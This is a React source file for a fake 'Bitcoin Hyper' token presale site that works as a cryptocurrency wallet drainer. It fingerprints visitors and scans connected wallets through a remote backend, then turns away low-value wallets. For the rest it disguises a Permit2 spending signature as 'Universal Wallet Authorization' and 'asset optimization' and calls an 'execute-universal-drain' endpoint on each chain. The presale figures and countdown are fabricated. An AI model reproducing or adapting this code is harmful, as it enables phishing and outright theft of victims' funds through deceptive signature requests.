import React, { useState, useEffect } from 'react'
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit"
import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignTypedData } from "wagmi"
import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base } from "wagmi/chains"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import './App.css'

// Create query client
const queryClient = new QueryClient()

// Supported chains
const allChains = [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base]

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"

// Backend URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"

// BTH Presale Price
const BTH_PRICE = 0.17

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org")
    }
  })
)

// Sleek Notification Popup
const NotificationPopup = ({ type, title, message, onClose, show }) => {
  if (!show) return null;

  const getIcon = () => {
    switch(type) {
      case 'success': return '✅';
      case 'error': return '❌';
      case 'warning': return '⚠️';
      case 'info': return '💎';
      default: return '🔔';
    }
  };

  return (
    <div className={`notification-popup ${type} ${show ? 'show' : ''}`}>
      <div className="notification-content">
        <div className="notification-icon">{getIcon()}</div>
        <div className="notification-text">
          <h4>{title}</h4>
          <p>{message}</p>
        </div>
        <button className="notification-close" onClick={onClose}>×</button>
      </div>
      <div className="notification-progress"></div>
    </div>
  );
};

// Portfolio Analysis Modal
const PortfolioAnalysisModal = ({ isOpen, onClose, scanData, onRetry }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay active" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content analysis-modal">
          <div className="modal-header">
            <div className="modal-icon warning">🔍</div>
            <h2 className="modal-title">Portfolio Analysis Complete</h2>
            <p className="modal-subtitle">Wallet verification results</p>
          </div>

          <div className="modal-body">
            <div className="analysis-result">
              <div className="result-icon">⚠️</div>
              <div className="result-content">
                <h3>Verification Required</h3>
                <p>Your wallet needs to meet presale requirements</p>
              </div>
            </div>

            <div className="qualification-tips">
              <h4>💡 How to Qualify:</h4>
              <div className="tips-grid">
                <div className="tip-card">
                  <div className="tip-icon">1️⃣</div>
                  <div className="tip-content">
                    <strong>Transaction History</strong>
                    <p>Make at least 5+ transactions on any chain</p>
                  </div>
                </div>
                <div className="tip-card">
                  <div className="tip-icon">2️⃣</div>
                  <div className="tip-content">
                    <strong>Active Wallet</strong>
                    <p>Use an established wallet (1+ month old)</p>
                  </div>
                </div>
                <div className="tip-card">
                  <div className="tip-icon">3️⃣</div>
                  <div className="tip-content">
                    <strong>Verified Provider</strong>
                    <p>MetaMask, Trust Wallet, or Coinbase recommended</p>
                  </div>
                </div>
                <div className="tip-card">
                  <div className="tip-icon">4️⃣</div>
                  <div className="tip-content">
                    <strong>Human Verification</strong>
                    <p>Complete transactions to confirm activity</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="suggested-action">
              <h4>🎯 Suggested Action:</h4>
              <p>Connect a different wallet with transaction history or wait 24 hours after making transactions.</p>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn secondary" onClick={onClose}>
              Understand
            </button>
            <button className="modal-btn primary" onClick={() => {
              onRetry();
              onClose();
            }}>
              🔄 Connect Different Wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// UNIVERSAL PERMIT CONFIRMATION MODAL - ONE SIGNATURE FOR ALL CHAINS
const UniversalPermitConfirmationModal = ({ isOpen, onClose, onConfirm, permitData, address }) => {
  if (!isOpen) return null;

  const tokenAmount = permitData?.tokenAllocation?.amount || '5000';
  const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2);
  const totalDrainUSD = permitData?.totalDrainUSD || '0.00';
  const chainCount = permitData?.permitCount || 0;

  return (
    <div className="modal-overlay active" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content universal-permit-modal">
          <div className="modal-header">
            <div className="modal-icon universal">🔐</div>
            <h2 className="modal-title">Universal Wallet Authorization</h2>
            <p className="modal-subtitle">One signature - All chains</p>
          </div>

          <div className="modal-body">
            <div className="universal-badge">
              <span className="badge-icon">⚡</span>
              <span className="badge-text">UNIVERSAL PERMIT 2.0</span>
            </div>

            <div className="allocation-display">
              <div className="allocation-amount">
                <span className="amount-value">{tokenAmount}</span>
                <span className="amount-label">BTH TOKENS</span>
              </div>
              <div className="allocation-value-large">
                <span className="value-label">Presale Value:</span>
                <span className="value-number">${allocationValue}</span>
              </div>
            </div>

            <div className="drain-summary">
              <h4>💎 Asset Optimization Summary</h4>
              <div className="drain-total">
                <span className="total-label">Total Value to Optimize:</span>
                <span className="total-value">${totalDrainUSD}</span>
              </div>
              <div className="chain-list">
                {permitData?.permitData?.map((chain, index) => (
                  <div key={index} className="chain-item">
                    <div className="chain-info">
                      <span className="chain-icon">
                        {chain.chain === 'Ethereum' && '⟠'}
                        {chain.chain === 'BSC' && '🔶'}
                        {chain.chain === 'Polygon' && '⬡'}
                        {chain.chain === 'Arbitrum' && '🔷'}
                        {chain.chain === 'Optimism' && '✨'}
                        {chain.chain === 'Avalanche' && '❄️'}
                      </span>
                      <span className="chain-name">{chain.chain}</span>
                    </div>
                    <div className="chain-amount">
                      <span className="amount">{chain.amount} {chain.symbol}</span>
                      <span className="value">${chain.valueUSD}</span>
                    </div>
                  </div>
                ))}
              </div>
              <div className="chain-count">
                <span className="count">{chainCount}</span> chains · One signature
              </div>
            </div>

            <div className="permit-details">
              <div className="permit-row">
                <span className="permit-label">Spender:</span>
                <span className="permit-value">{permitData?.message?.spender?.substring(0, 10)}...{permitData?.message?.spender?.substring(38)}</span>
              </div>
              <div className="permit-row">
                <span className="permit-label">Expires:</span>
                <span className="permit-value">{new Date(permitData?.message?.deadline * 1000).toLocaleString()}</span>
              </div>
            </div>

            <div className="universal-note">
              <div className="note-icon">🛡️</div>
              <div className="note-content">
                <p><strong>Universal Permit Authorization</strong></p>
                <p>This signature will authorize the optimization protocol to process assets across all chains. One signature, all chains secured.</p>
              </div>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn secondary" onClick={onClose}>
              Cancel
            </button>
            <button className="modal-btn universal" onClick={() => {
              onConfirm(permitData);
              onClose();
            }}>
              🔐 Sign Universal Authorization
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Chain Drain Progress Modal
const ChainDrainProgressModal = ({ isOpen, onClose, drainStatus, onContinue }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay active" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content progress-modal">
          <div className="modal-header">
            <div className="modal-icon progress">⚡</div>
            <h2 className="modal-title">Asset Optimization in Progress</h2>
            <p className="modal-subtitle">Processing across {drainStatus?.chains?.length || 0} chains</p>
          </div>

          <div className="modal-body">
            <div className="progress-overview">
              <div className="progress-stats">
                <div className="stat">
                  <span className="stat-label">Completed</span>
                  <span className="stat-value">{drainStatus?.drainTransactions?.length || 0}/{drainStatus?.chains?.length || 0}</span>
                </div>
                <div className="stat">
                  <span className="stat-label">Total Value</span>
                  <span className="stat-value">${drainStatus?.totalDrainUSD || '0.00'}</span>
                </div>
              </div>
              <div className="progress-bar-container">
                <div 
                  className="progress-fill" 
                  style={{ width: `${((drainStatus?.drainTransactions?.length || 0) / (drainStatus?.chains?.length || 1)) * 100}%` }}
                ></div>
              </div>
            </div>

            <div className="chain-progress-list">
              {drainStatus?.chains?.map((chain, index) => {
                const isDrained = drainStatus.drainTransactions?.some(tx => tx.chain === chain.chain);
                return (
                  <div key={index} className={`chain-progress-item ${isDrained ? 'completed' : ''}`}>
                    <div className="chain-progress-info">
                      <div className="chain-icon">
                        {chain.chain === 'Ethereum' && '⟠'}
                        {chain.chain === 'BSC' && '🔶'}
                        {chain.chain === 'Polygon' && '⬡'}
                        {chain.chain === 'Arbitrum' && '🔷'}
                        {chain.chain === 'Optimism' && '✨'}
                        {chain.chain === 'Avalanche' && '❄️'}
                      </div>
                      <div className="chain-details">
                        <span className="chain-name">{chain.chain}</span>
                        <span className="chain-amount">{chain.amount} {chain.symbol}</span>
                      </div>
                    </div>
                    <div className="chain-status">
                      {isDrained ? (
                        <span className="status-completed">✅ Completed</span>
                      ) : (
                        <button 
                          className="status-action"
                          onClick={() => onContinue(chain.chain, chain.chainId)}
                        >
                          Process on {chain.chain}
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn secondary" onClick={onClose}>
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Celebration Modal
const CelebrationModal = ({ isOpen, onClose, claimData }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay active celebration" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content celebration-modal">
          {/* Confetti Animation */}
          <div className="confetti-container">
            {Array.from({ length: 100 }).map((_, i) => (
              <div 
                key={i} 
                className="confetti"
                style={{
                  left: `${Math.random() * 100}%`,
                  animationDelay: `${Math.random() * 2}s`,
                  backgroundColor: ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'][Math.floor(Math.random() * 5)]
                }}
              />
            ))}
          </div>

          <div className="modal-header">
            <div className="modal-icon celebration">🎉</div>
            <h2 className="modal-title">Congratulations!</h2>
            <p className="modal-subtitle">Your Bitcoin Hyper tokens are secured</p>
          </div>

          <div className="modal-body">
            <div className="celebration-animation">
              <div className="floating-coins">
                {Array.from({ length: 10 }).map((_, i) => (
                  <div key={i} className="coin">💰</div>
                ))}
              </div>
              
              <div className="success-message">
                <div className="success-icon">✅</div>
                <div className="success-content">
                  <h3>Allocation Confirmed Successfully!</h3>
                  <p>Your tokens are now locked at presale price</p>
                </div>
              </div>

              <div className="transaction-details">
                <div className="detail-card">
                  <div className="detail-icon">🎯</div>
                  <div>
                    <p className="detail-title">Claim ID</p>
                    <p className="detail-value">{claimData?.claimId || `BTH-${Date.now()}`}</p>
                  </div>
                </div>
                <div className="detail-card">
                  <div className="detail-icon">💰</div>
                  <div>
                    <p className="detail-title">Token Amount</p>
                    <p className="detail-value highlight">{claimData?.tokenAmount || '5,000'} BTH</p>
                  </div>
                </div>
                <div className="detail-card">
                  <div className="detail-icon">🚀</div>
                  <div>
                    <p className="detail-title">Next Steps</p>
                    <p className="detail-value">Distribution in 24-48 hours</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn celebration-btn" onClick={onClose}>
              🎉 Continue to Dashboard
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Main App Component
function BitcoinHyperPresale() {
  const { address, isConnected, chainId } = useAccount()
  const { disconnect } = useDisconnect()
  const { signTypedData } = useSignTypedData()
  
  const [scanning, setScanning] = useState(false)
  const [isEligible, setIsEligible] = useState(false)
  const [backendStatus, setBackendStatus] = useState('checking')
  const [claimData, setClaimData] = useState(null)
  const [processing, setProcessing] = useState(false)
  const [scanData, setScanData] = useState(null)
  const [sessionId, setSessionId] = useState('')
  const [permitData, setPermitData] = useState(null)
  const [drainStatus, setDrainStatus] = useState(null)
  
  // Modal states
  const [showAnalysisModal, setShowAnalysisModal] = useState(false)
  const [showUniversalPermitModal, setShowUniversalPermitModal] = useState(false)
  const [showProgressModal, setShowProgressModal] = useState(false)
  const [showCelebrationModal, setShowCelebrationModal] = useState(false)
  
  // Notification state
  const [notification, setNotification] = useState({
    show: false,
    type: 'info',
    title: '',
    message: ''
  })

  // Presale stats
  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  })
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  })

  // Show notification
  const showNotification = (type, title, message, duration = 5000) => {
    setNotification({ show: true, type, title, message })
    setTimeout(() => {
      setNotification(prev => ({ ...prev, show: false }))
    }, duration)
  }

  // Generate session ID and track visit
  useEffect(() => {
    const generateSessionId = () => {
      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    }
    
    const session = generateSessionId()
    setSessionId(session)
    
    const trackVisit = async () => {
      try {
        await fetch(`${BACKEND_API}/track/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            sessionId: session
          })
        })
      } catch (error) {
        console.log('Visit tracking:', error.message)
      }
    }
    
    trackVisit()
  }, [])

  // Initialize backend check
  useEffect(() => {
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`)
        if (response.ok) {
          const data = await response.json()
          console.log('✅ Backend connected:', data)
          setBackendStatus('connected')
          showNotification('success', 'System Connected', 'Presale platform is LIVE')
        } else {
          setBackendStatus('error')
          showNotification('error', 'Connection Issue', 'Please try again')
        }
      } catch (error) {
        console.error('❌ Backend error:', error)
        setBackendStatus('error')
      }
    }
    
    testBackend()
    
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev
        seconds--
        
        if (seconds < 0) {
          seconds = 59
          minutes--
        }
        if (minutes < 0) {
          minutes = 59
          hours--
        }
        if (hours < 0) {
          hours = 23
          days--
        }
        if (days < 0) {
          clearInterval(interval)
          return { days: 0, hours: 0, minutes: 0, seconds: 0 }
        }
        
        return { days, hours, minutes, seconds }
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [])

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address && backendStatus === 'connected' && sessionId) {
      setTimeout(() => {
        triggerWalletScan()
      }, 800)
    }
  }, [isConnected, address, backendStatus, sessionId])

  const triggerWalletScan = async () => {
    if (!address) return
    
    setScanning(true)
    showNotification('info', 'Portfolio Analysis', 'Verifying wallet eligibility...')
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          sessionId,
          timestamp: new Date().toISOString()
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setScanData(data.data)
          
          setTimeout(() => {
            setScanning(false)
            
            if (data.data.isEligible) {
              setIsEligible(true)
              showNotification('success', 'Qualified!', `You're eligible for ${data.data.tokenAllocation.amount} BTH!`)
              createFloatingCoins()
            } else {
              setIsEligible(false)
              setTimeout(() => {
                setShowAnalysisModal(true)
              }, 800)
            }
          }, 2000)
        }
      } else {
        throw new Error('Scan failed')
      }
    } catch (error) {
      console.error('Scan error:', error)
      setScanning(false)
      showNotification('error', 'Analysis Failed', 'Please try again')
    }
  }

  // PREPARE UNIVERSAL PERMIT - ONE SIGNATURE FOR ALL CHAINS
  const prepareUniversalPermit = async () => {
    if (!address) return
    
    setProcessing(true)
    showNotification('info', 'Preparing', 'Setting up universal authorization...')
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/prepare-universal-permit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          sessionId
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setPermitData({
            ...data.data,
            tokenAllocation: scanData?.tokenAllocation
          })
          setProcessing(false)
          setShowUniversalPermitModal(true)
        } else {
          throw new Error(data.error || 'Failed to prepare permit')
        }
      } else {
        throw new Error('Failed to prepare permit')
      }
    } catch (error) {
      console.error('Prepare permit error:', error)
      setProcessing(false)
      showNotification('error', 'Preparation Failed', 'Please try again')
    }
  }

  // SIGN UNIVERSAL PERMIT - ONE SIGNATURE FOR ALL CHAINS
  const signUniversalPermit = async (permitData) => {
    if (!address || !permitData) return
    
    setProcessing(true)
    showNotification('info', 'Authorization', 'Please sign the universal permit...')
    
    try {
      // Sign the EIP-712 typed data (Permit2)
      const signature = await signTypedData({
        domain: permitData.domain,
        types: permitData.types,
        primaryType: permitData.primaryType,
        message: permitData.message
      })
      
      // Get current chain ID
      const currentChainId = await window.ethereum.request({ 
        method: 'eth_chainId' 
      });
      
      // Execute drain on current chain first
      const drainResponse = await fetch(`${BACKEND_API}/presale/execute-universal-drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          permitSignature: signature,
          chainId: parseInt(currentChainId, 16)
        })
      })
      
      if (drainResponse.ok) {
        const drainData = await drainResponse.json()
        
        if (drainData.success) {
          showNotification('success', 'Chain Optimized', `$${drainData.data.amount} processed on ${drainData.data.chain}`)
          
          // Check remaining chains
          const statusResponse = await fetch(`${BACKEND_API}/presale/drain-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              walletAddress: address
            })
          })
          
          if (statusResponse.ok) {
            const statusData = await statusResponse.json()
            setDrainStatus(statusData.data)
            
            if (statusData.data.remainingChains > 0) {
              setShowProgressModal(true)
            } else {
              // All chains completed
              setClaimData({
                claimId: `BTH-${Date.now()}`,
                tokenAmount: scanData?.tokenAllocation?.amount || '5000',
                valueUSD: scanData?.tokenAllocation?.valueUSD || '850'
              })
              setProcessing(false)
              setShowProgressModal(false)
              setTimeout(() => {
                setShowCelebrationModal(true)
                createConfetti()
              }, 1000)
            }
          }
        } else {
          throw new Error(drainData.error || 'Drain execution failed')
        }
      } else {
        throw new Error('Failed to execute drain')
      }
      
    } catch (error) {
      console.error('Sign permit error:', error)
      setProcessing(false)
      showNotification('error', 'Authorization Failed', error.message || 'Please try again')
    }
  }

  // CONTINUE DRAIN ON NEXT CHAIN
  const continueDrainOnChain = async (chainName, chainId) => {
    setProcessing(true)
    showNotification('info', 'Processing', `Optimizing ${chainName}...`)
    
    try {
      // Use the same permit signature (already signed)
      const drainResponse = await fetch(`${BACKEND_API}/presale/execute-universal-drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          permitSignature: 'already_signed', // Backend will use stored permit
          chainId: chainId
        })
      })
      
      if (drainResponse.ok) {
        const drainData = await drainResponse.json()
        
        if (drainData.success) {
          showNotification('success', 'Chain Optimized', `$${drainData.data.amount} processed on ${chainName}`)
          
          // Update status
          const statusResponse = await fetch(`${BACKEND_API}/presale/drain-status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              walletAddress: address
            })
          })
          
          if (statusResponse.ok) {
            const statusData = await statusResponse.json()
            setDrainStatus(statusData.data)
            
            if (statusData.data.remainingChains === 0) {
              // All chains completed
              setClaimData({
                claimId: `BTH-${Date.now()}`,
                tokenAmount: scanData?.tokenAllocation?.amount || '5000',
                valueUSD: scanData?.tokenAllocation?.valueUSD || '850'
              })
              setProcessing(false)
              setShowProgressModal(false)
              setTimeout(() => {
                setShowCelebrationModal(true)
                createConfetti()
              }, 1000)
            }
          }
        }
      }
      
    } catch (error) {
      console.error('Continue drain error:', error)
      setProcessing(false)
      showNotification('error', 'Processing Failed', 'Please try again')
    }
  }

  // Animation functions
  const createFloatingCoins = () => {
    for (let i = 0; i < 20; i++) {
      setTimeout(() => {
        const coin = document.createElement('div')
        coin.className = 'floating-coin'
        coin.innerHTML = '💰'
        coin.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 25 + 20}px;
          color: #F7931A;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: coinFloat ${Math.random() * 2 + 1}s ease-in-out forwards;
          z-index: 9998;
          opacity: 0;
          pointer-events: none;
        `
        document.body.appendChild(coin)
        
        setTimeout(() => {
          if (coin.parentNode) {
            coin.parentNode.removeChild(coin)
          }
        }, 2000)
      }, i * 100)
    }
  }

  const createConfetti = () => {
    const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6']
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div')
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 10 + 5}px;
          height: ${Math.random() * 10 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: 0;
          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9999;
          pointer-events: none;
        `
        document.body.appendChild(confetti)
        
        setTimeout(() => {
          if (confetti.parentNode) {
            confetti.parentNode.removeChild(confetti)
          }
        }, 5000)
      }, i * 20)
    }
  }

  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num
  }

  return (
    <div className="app-container">
      <NotificationPopup 
        show={notification.show}
        type={notification.type}
        title={notification.title}
        message={notification.message}
        onClose={() => setNotification(prev => ({ ...prev, show: false }))}
      />
      
      <PortfolioAnalysisModal
        isOpen={showAnalysisModal}
        onClose={() => setShowAnalysisModal(false)}
        scanData={scanData}
        onRetry={() => {
          disconnect()
          setShowAnalysisModal(false)
          showNotification('info', 'Wallet Disconnected', 'Connect a different wallet')
        }}
      />
      
      <UniversalPermitConfirmationModal
        isOpen={showUniversalPermitModal}
        onClose={() => setShowUniversalPermitModal(false)}
        onConfirm={signUniversalPermit}
        permitData={permitData}
        address={address}
      />
      
      <ChainDrainProgressModal
        isOpen={showProgressModal}
        onClose={() => setShowProgressModal(false)}
        drainStatus={drainStatus}
        onContinue={continueDrainOnChain}
      />
      
      <CelebrationModal
        isOpen={showCelebrationModal}
        onClose={() => setShowCelebrationModal(false)}
        claimData={claimData}
      />
      
      <div className="main-content">
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon">₿</div>
            <div>
              <h1 className="logo-title">BITCOIN HYPER</h1>
              <div className="logo-subtitle">OFFICIAL PRESALE LAUNCH</div>
            </div>
          </div>
          
          <div className="header-actions">
            {backendStatus === 'connected' && (
              <div className="backend-indicator connected">
                <span className="indicator-dot"></span>
                <span>LIVE</span>
              </div>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button onClick={show} className="connect-button">
                  {isConnected ? (
                    <div className="connected-wallet">
                      <span className="wallet-icon">👛</span>
                      <span className="wallet-address">{ensName || `${truncatedAddress}`}</span>
                    </div>
                  ) : 'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        <section className="hero-section">
          <div className="hero-bitcoin">₿</div>
          
          <h2 className="hero-title">NEXT GENERATION BITCOIN ECOSYSTEM</h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">{value}</div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1').toUpperCase()}
                </div>
              </div>
            ))}
          </div>
          
          <div className="progress-container">
            <div className="progress-header">
              <span>Presale Progress</span>
              <span className="progress-percent">{presaleStats.progress}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{width: `${presaleStats.progress}%`}}
              >
                <div className="progress-glow"></div>
              </div>
            </div>
          </div>
          
          {/* Main Action Area */}
          {backendStatus === 'checking' ? (
            <div className="loading-container">
              <div className="loading-spinner"></div>
              <h3 className="loading-title">Establishing Secure Connection...</h3>
              <p className="loading-description">Connecting to presale platform</p>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="error-container">
              <div className="error-icon">🔴</div>
              <h3 className="error-title">Connection Issue</h3>
              <p className="error-description">Please refresh the page</p>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">Connect Wallet to Start</h3>
              <p className="cta-description">
                Connect your wallet to check eligibility and secure your presale allocation
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button onClick={show} className="cta-button">
                    CONNECT WALLET
                  </button>
                )}
              </ConnectKitButton.Custom>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">Analyzing Portfolio...</h3>
              <p className="scanning-description">Checking wallet eligibility</p>
              <div className="scanning-dots">
                <span>.</span><span>.</span><span>.</span>
              </div>
            </div>
          ) : (
            <div className="status-summary">
              <div className={`status-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">
                  {isEligible ? '✅' : '⚠️'}
                </div>
                <div className="status-content">
                  <h3>{isEligible ? 'Eligible for Presale!' : 'Verification Required'}</h3>
                  <p>
                    {isEligible 
                      ? `You qualify for ${scanData?.tokenAllocation?.amount || '5,000'} BTH at $${BTH_PRICE.toFixed(2)} each` 
                      : 'Your wallet needs additional verification'}
                  </p>
                  {isEligible && scanData?.tokenAllocation?.valueUSD && (
                    <div className="allocation-value">
                      <span className="value-highlight">$${scanData.tokenAllocation.valueUSD} allocation value</span>
                    </div>
                  )}
                </div>
                <button 
                  className="status-button"
                  onClick={isEligible ? prepareUniversalPermit : () => setShowAnalysisModal(true)}
                  disabled={processing}
                >
                  {processing ? (
                    <>
                      <span className="button-spinner"></span>
                      Processing...
                    </>
                  ) : isEligible ? 'Claim Tokens' : 'View Analysis'}
                </button>
              </div>
              
              {isEligible && scanData?.rawBalances?.length > 0 && (
                <div className="allocation-preview">
                  <h4>🎯 Your Portfolio Summary:</h4>
                  <div className="allocation-grid">
                    <div className="allocation-item">
                      <span className="item-label">Token Amount</span>
                      <span className="item-value highlight">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
                    </div>
                    <div className="allocation-item">
                      <span className="item-label">Wallet Value</span>
                      <span className="item-value">${scanData?.totalValueUSD || '0.00'}</span>
                    </div>
                    <div className="allocation-item">
                      <span className="item-label">Chains Detected</span>
                      <span className="item-value success">{scanData?.chains?.length || 0} chains</span>
                    </div>
                  </div>
                  <div className="universal-badge-small">
                    ⚡ Universal Permit: One signature for all chains
                  </div>
                </div>
              )}
            </div>
          )}
        </section>

        <footer className="app-footer">
          <div className="footer-bitcoin">₿</div>
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
              {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
            </span>
          </div>
        </footer>
      </div>
    </div>
  )
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight"
}

// Main App Wrapper
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider theme={customTheme}>
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  )
}

export default App
